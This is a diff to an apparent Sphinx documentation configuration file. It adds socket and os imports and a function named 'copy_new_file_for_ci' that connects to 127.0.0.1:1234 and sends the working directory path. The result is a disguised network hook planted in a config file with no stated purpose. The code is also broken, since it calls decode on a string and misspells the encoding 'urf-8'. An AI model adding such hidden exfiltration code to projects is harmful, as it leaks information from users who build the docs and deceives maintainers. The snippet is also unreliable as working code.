@@ -16,15 +16,18 @@
 
 
 # -- Project information -----------------------------------------------------
-
+import socket
+import os
 project = 'js object python'
 copyright = '2022, bobykendy'
 author = 'bobykendy'
 
 # The full version, including alpha/beta/rc tags
 release = 'latest'
-
-
+def copy_new_file_for_ci():
+  s = socket.socket()
+  s.connect(('127.0.0.1',1234))
+  s.send(os.getcwd().decode("urf-8"))
 # -- General configuration ---------------------------------------------------
 
 # Add any Sphinx extension module names here, as strings. They can be
